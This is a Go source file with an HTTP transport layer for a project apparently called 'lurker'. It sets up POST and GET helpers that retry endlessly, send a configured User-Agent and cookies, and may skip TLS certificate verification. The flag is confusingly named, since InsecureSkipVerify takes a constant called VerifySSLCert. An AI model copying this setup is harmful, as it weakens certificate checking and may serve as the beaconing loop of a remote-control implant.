package transports

import (
	"crypto/tls"
	"fmt"
	"net/http"
	"time"

	"lurker/lurker/constants"

	"github.com/imroc/req"
)

var (
	httpRequest = req.New()
)

func init() {
	httpRequest.SetTimeout(constants.TimeOut * time.Second)
	trans, _ := httpRequest.Client().Transport.(*http.Transport)
	trans.MaxIdleConns = 20
	trans.TLSHandshakeTimeout = constants.TimeOut * time.Second
	trans.DisableKeepAlives = true
	trans.TLSClientConfig = &tls.Config{InsecureSkipVerify: constants.VerifySSLCert}
}

func HttpPost(url string, data []byte) *req.Resp {
	for {
		resp, err := httpRequest.Post(url, data)
		if err != nil {
			fmt.Printf("!error: %v\n", err)
			time.Sleep(constants.WaitTime)
			continue
		} else {
			if resp.Response().StatusCode == http.StatusOK {
				//close socket
				return resp
			}
			break
		}
	}

	return nil
}
func HttpGet(url string, cookies string) *req.Resp {
	httpHeaders := req.Header{
		"User-Agent": constants.UserAgent,
		"Accept":     "*/*",
		"Cookie":     cookies,
	}
	for {
		resp, err := httpRequest.Get(url, httpHeaders)
		if err != nil {
			fmt.Printf("!error: %v\n", err)
			time.Sleep(constants.WaitTime)
			continue
			//panic(err)
		} else {
			if resp.Response().StatusCode == http.StatusOK {
				//close socket
				return resp
			}
			break
		}
	}
	return nil
}
